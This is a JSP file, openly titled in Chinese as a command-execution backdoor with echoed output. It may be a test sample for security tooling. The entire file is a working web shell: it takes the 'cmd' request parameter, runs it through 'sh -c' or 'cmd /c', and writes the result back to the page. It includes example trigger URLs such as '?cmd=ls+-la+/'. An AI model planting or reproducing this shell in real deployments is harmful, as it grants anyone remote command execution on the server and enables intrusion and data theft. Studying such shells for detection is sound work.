<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>
<%@ page import="java.lang.reflect.*" %>
<%@ page contentType="text/html; charset=UTF-8" %>
<html>
<head>  
    <meta charset="UTF-8"/>
    <title>命令执行后门（有回显）</title>
</head>
<body>
    <h1>命令执行后门（有回显）</h1>
<%
String linux_querystring = "?cmd=ls+-la+/";
String windows_querystring = "?cmd=cmd+/c+dir";
String error_querystring = "?cmd=error";
String output = "";
String cmd    = request.getParameter ("cmd");
if (cmd != null)
{
    if (cmd.equals("error")) {
        cmd = "echo 'test' xxxx'";
    }
    try {
        ProcessBuilder builder;
        if (File.separator.startsWith ("\\"))
            builder = new ProcessBuilder ("cmd", "/c", cmd);
        else
            builder = new ProcessBuilder ("sh", "-c", cmd);

        Process pro   = builder.start();
        BufferedReader reader = new BufferedReader(new InputStreamReader(pro.getInputStream()));

        String s = reader.readLine();
        while (s != null) {
            output = output + s + "\n";
            s = reader.readLine();
        }
        reader.close();
        output = output.replace("<", "&lt;");
        output = output.replace(">", "&gt;");
    } catch (Exception e) {
        out.print("<pre>");
        e.printStackTrace(response.getWriter());
        out.print("</pre>");
    }
} else {
    cmd = "whoami;ls;pwd";
}
%>
<div>
    <p>Linux/MacOS 触发: </p>
    <p>curl '<a href="<%=request.getRequestURL()+linux_querystring%>" target="_blank"><%=request.getRequestURL()+linux_querystring%></a>'</p>
    <br>
<pre>
<%=output %>
</pre>
</div>
</body>
</html>
